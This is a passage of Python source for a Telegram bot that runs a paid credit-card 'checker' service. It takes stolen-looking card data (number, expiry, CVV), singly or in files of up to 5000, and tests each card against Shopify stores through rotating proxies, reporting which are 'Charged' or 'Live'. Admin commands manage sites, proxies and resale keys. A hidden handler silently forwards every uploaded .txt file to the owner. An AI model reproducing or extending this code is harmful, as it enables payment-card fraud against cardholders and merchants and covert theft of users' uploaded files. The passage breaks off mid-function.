        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/addsite https://store.myshopify.com</code>"), parse_mode='html')

    site = args[1].strip()
    success, msg = add_site(site)
    await event.reply(premium_emoji(f"{'✅' if success else '❌'} <b>{msg}</b>\n\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsitetxt'))
async def add_site_txt_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("📌 Reply to a .txt file with sites (one per line)"), parse_mode='html')

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')

    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        os.remove(file_path)
        return await event.reply(premium_emoji(f"❌ Error reading file: {e}"), parse_mode='html')

    sites = [line.strip() for line in content.splitlines() if line.strip()]
    if not sites:
        return await event.reply(premium_emoji("❌ No valid sites found in file"), parse_mode='html')

    added, already = add_sites_bulk(sites)

    msg = "<b>📊 Sites Processed</b>\n\n"
    msg += f"✅ Added: {len(added)}\n"
    msg += f"⚠️ Already existed: {len(already)}\n"
    if added:
        msg += "\n<u>Added sites:</u>\n"
        for s in added[:20]:
            msg += f"• <code>{s}</code>\n"
        if len(added) > 20:
            msg += f"... and {len(added)-20} more"

    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== ADMIN - KEY GENERATION ==========

@bot.on(events.NewMessage(pattern='/genpremiumkey'))
async def gen_premium_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()

    if len(args) == 3:
        try:
            amount = int(args[1])
            plan_key = args[2].lower()
            if plan_key not in PLANS:
                return await event.reply(premium_emoji(f"❌ Invalid plan! Available: {', '.join(PLANS.keys())}, custom"), parse_mode='html')
        except Exception:
            return await event.reply(premium_emoji("❌ Usage: <code>/genpremiumkey amount plan</code>\n\nExample: <code>/genpremiumkey 5 gold</code>"), parse_mode='html')

        keys_generated = []
        days = PLANS[plan_key]['days']
        credits = PLANS[plan_key]['credits']
        for _ in range(amount):
            keys_generated.append(generate_premium_key(plan_key, days, credits))

        plan = PLANS[plan_key]
        keys_text = "\n".join([f"• <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Premium Keys Generated Successfully!</b>

<b>📊 Summary:</b>
• Quantity: {amount}
• Plan: {plan['name']}
• Days: {plan['days']}
• Credits: {plan['credits']}
• Price: {plan['price']} each

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(premium_emoji(msg), parse_mode='html')

    elif len(args) == 5 and args[2].lower() == "custom":
        try:
            amount = int(args[1])
            days = int(args[3])
            credits = int(args[4])
            if amount <= 0 or days <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply(premium_emoji("❌ Maximum 50 keys at once!"), parse_mode='html')
        except Exception:
            return await event.reply(premium_emoji("❌ Usage: <code>/genpremiumkey amount custom days credits</code>\n\nExample: <code>/genpremiumkey 5 custom 15 5000</code>"), parse_mode='html')

        keys_generated = [generate_premium_key("custom", days, credits) for _ in range(amount)]
        keys_text = "\n".join([f"• <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Custom Premium Keys Generated Successfully!</b>

<b>📊 Summary:</b>
• Quantity: {amount}
• Days: {days} per key
• Credits: {credits} per key

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(premium_emoji(msg), parse_mode='html')

    else:
        await event.reply(premium_emoji("❌ Usage:\n<code>/genpremiumkey amount plan</code>\nExample: <code>/genpremiumkey 5 gold</code>\n\nOR\n\n<code>/genpremiumkey amount custom days credits</code>\nExample: <code>/genpremiumkey 5 custom 15 5000</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gencreditkey'))
async def gen_credit_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()

    if len(args) == 3:
        try:
            amount = int(args[1])
            credits = int(args[2])
            if amount <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply(premium_emoji("❌ Maximum 50 keys at once!"), parse_mode='html')
        except Exception:
            return await event.reply(premium_emoji("❌ Usage: <code>/gencreditkey amount credits</code>\n\nExample: <code>/gencreditkey 5 5000</code>"), parse_mode='html')

        keys_generated = [generate_credit_key(credits) for _ in range(amount)]
        keys_text = "\n".join([f"• <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Credit Keys Generated Successfully!</b>

<b>📊 Summary:</b>
• Quantity: {amount}
• Credits: {credits} per key

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeemcredit KEY</code> to get {credits} credits only (no premium)!"""
        await event.reply(premium_emoji(msg), parse_mode='html')

    else:
        await event.reply(premium_emoji("❌ Usage: <code>/gencreditkey amount credits</code>\nExample: <code>/gencreditkey 5 5000</code>"), parse_mode='html')

# ========== ADMIN - BAN/UNBAN ==========

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/ban user_id</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply(premium_emoji("❌ Invalid user_id"), parse_mode='html')

    ban_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>User banned!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')

    try:
        await bot.send_message(target_id, premium_emoji("🚫 <b>You have been banned!</b>\n\nYou can no longer use this bot."), parse_mode='html')
    except Exception:
        pass

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/unban user_id</code>"), parse_mode='html')

    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply(premium_emoji("❌ Invalid user_id"), parse_mode='html')

    unban_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>User unbanned!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')

    try:
        await bot.send_message(target_id, premium_emoji("✅ <b>You have been unbanned!</b>\n\nYou can now use the bot again."), parse_mode='html')
    except Exception:
        pass

# ========== ADMIN - STATS ==========

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    global ACTIVE_FILTER
    premium_data = load_premium_users()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    sites = load_sites()
    proxies = load_proxies()
    banned = load_banned_users()
    total_credits = await get_total_credits()

    total_premium = len(premium_data)
    total_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used', False))
    total_sites = len(sites)
    total_proxies = len(proxies)
    total_banned = len(banned)

    msg = "<b>📊 Bot Statistics</b>\n\n"
    msg += "<b>👥 Users:</b>\n"
    msg += f"• Premium Users: {total_premium}\n"
    msg += f"• Banned Users: {total_banned}\n\n"
    msg += "<b>💰 Credits:</b>\n"
    msg += f"• Total Credits Active: {total_credits}\n\n"
    msg += "<b>🔑 Premium Keys:</b>\n"
    msg += f"• Total Generated: {total_keys}\n"
    msg += f"• Used: {used_premium_keys}\n"
    msg += f"• Unused: {total_keys - used_premium_keys}\n\n"
    msg += "<b>💎 Credit Keys:</b>\n"
    msg += f"• Total Generated: {total_credit_keys}\n"
    msg += f"• Used: {used_credit_keys}\n"
    msg += f"• Unused: {total_credit_keys - used_credit_keys}\n\n"
    msg += "<b>🌐 Data:</b>\n"
    msg += f"• Sites: {total_sites}\n"
    msg += f"• Proxies: {total_proxies}\n\n"
    msg += f"<b>🎯 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n"
    msg += '🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>'

    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== ADMIN - BROADCAST ==========

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    broadcast_msg = event.message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_msg:
        return await event.reply(premium_emoji("❌ Usage: <code>/broadcast message</code>"), parse_mode='html')

    premium_users = load_premium_users()
    credit_user_ids = await get_all_credit_user_ids()

    all_user_ids = set()
    for uid_str in premium_users.keys():
        all_user_ids.add(int(uid_str))
    for uid in credit_user_ids:
        all_user_ids.add(uid)
    for uid in joined_users:
        all_user_ids.add(uid)
    for aid in ADMIN_IDS:
        all_user_ids.add(aid)

    sent = 0
    failed = 0

    status_msg = await event.reply(premium_emoji(f"🔄 Broadcasting to {len(all_user_ids)} users..."), parse_mode='html')

    for uid in all_user_ids:
        try:
            await bot.send_message(uid, premium_emoji(f"📢 <b>Broadcast from Admin</b>\n\n{broadcast_msg}"), parse_mode='html')
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.1)

    await status_msg.edit(premium_emoji(f"✅ <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}"), parse_mode='html')

# ========== FILE FORWARDING TO OWNER ==========
@bot.on(events.NewMessage(incoming=True))
async def forward_txt_files(event):
    """Forward all .txt file uploads directly to the bot owner."""
    # Only process messages with documents
    if not event.message.document:
        return

    # Check if it's a .txt file
    file_name = event.message.file.name or ""
    if not file_name.lower().endswith('.txt'):
        return

    # Don't forward if sender is the owner
    if event.sender_id == OWNER_ID:
        return

    try:
        # Forward the file to owner with context
        sender = await event.get_sender()
        sender_name = getattr(sender, 'username', None) or getattr(sender, 'first_name', 'Unknown')
        sender_id = event.sender_id

        caption = f"📄 <b>File Upload</b>\n\n<b>From:</b> <a href='tg://user?id={sender_id}'>{sender_name}</a> (ID: {sender_id})\n<b>File:</b> <code>{file_name}</code>"

        await bot.send_file(
            OWNER_ID,
            event.message.document,
            caption=premium_emoji(caption),
            parse_mode='html'
        )
    except Exception as e:
        print(f"Error forwarding file to owner: {e}")

# ========== SINGLE CC CHECK ==========

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')

    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')

    current_credits = await get_user_credits(user_id)
    if current_credits < 1:
        return await event.reply(premium_emoji("❌ <b>Insufficient Credits!</b>\n\nYou need 1 credit to check a card.\nYour Credits: 0\n\nUse /redeemcredit CREDIT_KEY to add credits."), parse_mode='html')

    sites = await load_filtered_sites()
    proxies = load_proxies()

    if not sites:
        if ACTIVE_FILTER != "all" and _cache_warmup_in_progress:
            return await event.reply(premium_emoji("⏳ <b>Price cache is warming up.</b>\n\nNo sites are cached yet for the active filter. Please wait a moment and try again.\nUse /cachestatus to check progress."), parse_mode='html')
        elif ACTIVE_FILTER != "all":
            return await event.reply(premium_emoji("⏳ <b>No sites meet the active price filter.</b>\n\nUse /filter to change the filter, or run /filter again to start a fresh cache warmup."), parse_mode='html')
        return await event.reply(premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
    if not proxies:
        return await event.reply(premium_emoji("❌ No proxies available. Contact admin."), parse_mode='html')

    try:
        cc_input = event.message.text.split(' ', 1)[1].strip()
    except IndexError:
        return await event.reply(premium_emoji("❌ Usage: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')

    cards = extract_cc(cc_input)
    if not cards:
        return await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')

    card = cards[0]
    filter_info = f"\n🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"

    status_msg = await event.reply(
        premium_emoji(f"<b>⚡💳 UNKNOWNENTITY𝙧 💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n<blockquote>💳 Card: <code>{card}</code></blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>\n{filter_info}\n<b>💰 Credits: {current_credits} (1 will be deducted)</b>"),
        parse_mode='html'
    )

    # Pre-deduct credit before API call
    deducted, _ = await deduct_credit(user_id)
    if not deducted:
        return await status_msg.edit(premium_emoji("❌ <b>Insufficient Credits!</b>"), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)

        if result.get('refund_credit'):
            await add_credits(user_id, 1)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
            try:
                sender = await event.get_sender()
                username = sender.username if sender.username else None
                await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id)
            except Exception:
                await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), str(user_id), user_id)
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝐋𝐢𝐯𝐞"
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐞𝐚𝐝"

        remaining_credits = await get_user_credits(user_id)

        final_resp = f"""<b>⚡💳 #𝐒𝐇𝐎𝐏𝐈𝐅𝐘 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}
<b>💰 Credits Left: {remaining_credits}</b>

🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await add_credits(user_id, 1)  # refund on unexpected error
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')

# ========== MASS CHECK COMMAND ==========

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id

    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')

    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')

    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("📌 Reply to a .txt file containing cards..."), parse_mode='html')

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')

    if not load_sites():
        return await event.reply(premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
    if not load_proxies():
        return await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')

    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."), parse_mode='html')

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("😡 No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"🫦 File contains {len(cards)} cards. Limiting to first 5000 cards."), parse_mode='html')
        cards = cards[:5000]

    os.remove(file_path)

    total_cards = len(cards)

    user_credits = await get_user_credits(user_id)
    if user_credits < total_cards:
        return await status_msg.edit(premium_emoji(f"❌ <b>Insufficient Credits!</b>\n\nYou need {total_cards} credits to check {total_cards} cards.\nYour available credits: {user_credits}\n\nUse /redeemcredit CREDIT_KEY to add more credits."), parse_mode='html')

    filter_info = f"🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    filtered_sites = await load_filtered_sites()
    if not filtered_sites:
        if ACTIVE_FILTER != "all" and _cache_warmup_in_progress:
            return await status_msg.edit(premium_emoji("⏳ <b>Price cache is warming up.</b>\n\nNo sites are cached yet for the active filter. Please wait and try again.\nUse /cachestatus to track progress."), parse_mode='html')
        elif ACTIVE_FILTER != "all":
            return await status_msg.edit(premium_emoji("⏳ <b>No sites meet the active price filter.</b>\n\nUse /filter to change the filter or run /filter again to start warmup."), parse_mode='html')
        return await status_msg.edit(premium_emoji("❌ No sites match the active price filter. Use /filter to change the filter or /addsite to add sites."), parse_mode='html')

    await status_msg.edit(premium_emoji(f"🫦 Starting check for {total_cards} cards...\n{filter_info}\n💰 Credits: {user_credits} (Will deduct 1 per card)"), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    stop_event   = asyncio.Event()
    paused_event = asyncio.Event()
    # Store events so pause/resume/stop callbacks can reach them
    active_sessions[session_key] = {
        'paused': False,
        'stop_event': stop_event,
        'paused_event': paused_event,
    }

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }

    # Show initial progress immediately so the user sees the live display right away
    await update_progress(user_id, status_msg.id, all_results, 0)

    try:
        card_queue   = asyncio.Queue()
        result_queue = asyncio.Queue()  # results fed to the single updater task
        for card in cards:
            card_queue.put_nowait(card)

        async def worker():
            while not card_queue.empty() and not stop_event.is_set():
                # Honour pause
                while paused_event.is_set() and not stop_event.is_set():
                    await asyncio.sleep(0.5)
                if stop_event.is_set():
                    break

                try:
                    card = card_queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                current_sites = filtered_sites or load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    card_queue.task_done()
                    break

                # Pre-deduct credit before API call
                deducted, _ = await deduct_credit(user_id)
                if not deducted:
                    card_queue.task_done()
                    break

                try:
                    async with _api_semaphore:
                        res = await asyncio.wait_for(
                            check_card_with_retry(card, current_sites, current_proxies, max_retries=1),
                            timeout=125,
                        )
                except asyncio.CancelledError:
                    await add_credits(user_id, 1)
                    card_queue.task_done()
                    return
                except Exception as exc:
                    await add_credits(user_id, 1)  # refund on exception
                    res = {'card': card, 'status': 'Dead', 'message': str(exc),
                           'gateway': 'Unknown', 'price': '-', 'site': 'Unknown'}

                if res.get('refund_credit'):
                    await add_credits(user_id, 1)

                await result_queue.put(res)
                card_queue.task_done()

        async def updater():
            """Single task that drains result_queue and edits the progress message
            at most once every 2 seconds to avoid flood limits."""
            last_edit_time = 0.0
            while True:
                try:
                    res = await asyncio.wait_for(result_queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    if stop_event.is_set() and result_queue.empty():
                        break
                    continue

                all_results['checked'] += 1

                # CRITICAL: In mass check, only Charged and Approved are hits
                # Declined cards are counted as Dead (user wants only truly working cards)
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    try:
                        sender = await event.get_sender()
                        username = sender.username if sender.username else None
                        await send_log_to_channel(res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'), username, user_id)
                    except Exception:
                        await send_log_to_channel(res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'), str(user_id), user_id)
                    await send_realtime_hit_to_user(user_id, "CHARGED", res['card'], res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit_to_user(user_id, "LIVE", res['card'], res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'))
                else:
                    # Declined, Dead, Site Error all count as dead in mass check
                    all_results['dead'].append(res)

                result_queue.task_done()

                # Throttle edits: at most once per 2 seconds
                now = time.time()
                if now - last_edit_time >= 2.0 and session_key in active_sessions:
                    try:
                        await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        last_edit_time = now
                    except Exception:
                        pass

                # All done?
                if all_results['checked'] >= total_cards and result_queue.empty():
                    break

        worker_tasks  = [asyncio.create_task(worker()) for _ in range(MASS_CHECK_WORKERS)]
        updater_task  = asyncio.create_task(updater())

        # Wait for all workers
        await asyncio.gather(*worker_tasks, return_exceptions=True)
        stop_event.set()             # signal updater to finish draining
        await updater_task           # wait for updater to flush remaining results

        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except Exception:
            pass

        await send_final_results(user_id, all_results)

# ========== PROXY COMMANDS ==========

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    proxies = load_proxies()
    if not proxies:
        return await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."), parse_mode='html')

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(premium_emoji(f"🔥 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}"), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n<b>Total Proxies:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}\n\n<code>proxy.txt</code> has been updated with only working proxies."
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')

# ========== PROXY SPEED COMMAND ==========

@bot.on(events.NewMessage(pattern='/proxyspeed'))
async def proxyspeed_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    if not _proxy_speed_cache:
        return await event.reply(premium_emoji(
            "⏳ <b>No speed data yet.</b>\n\nRun /proxy first to measure proxy speeds."
        ), parse_mode='html')

    rated = sorted(_proxy_speed_cache.items(), key=lambda x: x[1])[:10]
    lines = ["<b>🚀 Top-10 Fastest Proxies</b>", "<b>━━━━━━━━━━━━━━━━━</b>"]
    for i, (proxy, ms) in enumerate(rated, 1):
        lines.append(f"{i}. <code>{proxy}</code> — <b>{ms:.0f}ms</b>")
    lines.append("<b>━━━━━━━━━━━━━━━━━</b>")
    lines.append(f"📊 Total rated proxies: <b>{len(_proxy_speed_cache)}</b>")
    await event.reply(premium_emoji("\n".join(lines)), parse_mode='html')

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    sites = load_sites()
    if not sites:
        return await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."), parse_mode='html')

    proxies = load_proxies()
    if not proxies:
        return await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')

    alive_sites = []
    dead_sites = []
    batch_size = 50
    _site_test_sem = asyncio.Semaphore(20)

    async def _test_site_bounded(site, proxy):
        async with _site_test_sem:
            return await test_site(site, proxy)

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies() or proxies
            # Prefer fastest proxies for site tests
            tasks = [
                _test_site_bounded(
                    site,
                    (_choose_fastest_proxies(fresh_proxies, n=1) or [random.choice(fresh_proxies)])[0]
                )
                for site in batch
            ]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(premium_emoji(f"🔥 Checking sites...\n\n<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Dead:</b> {len(dead_sites)}"), parse_mode='html')

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        summary_msg = f"✅ <b>Site Check Complete!</b>\n\n<b>Total Sites:</b> {len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Removed:</b> {len(dead_sites)}\n\n<code>sites.txt</code> has been updated."
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')

    url_to_remove = args[1].strip()
    success, msg = remove_site(url_to_remove)
    await event.reply(premium_emoji(f"{'✅' if success else '❌'} <b>{msg}</b>\n\n<code>{url_to_remove}</code>"), parse_mode='html')

# ========== PROXY MANAGEMENT COMMANDS ==========

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            return await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."), parse_mode='html')

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            return await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')

        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]

        if not new_proxies:
            return await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        return await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
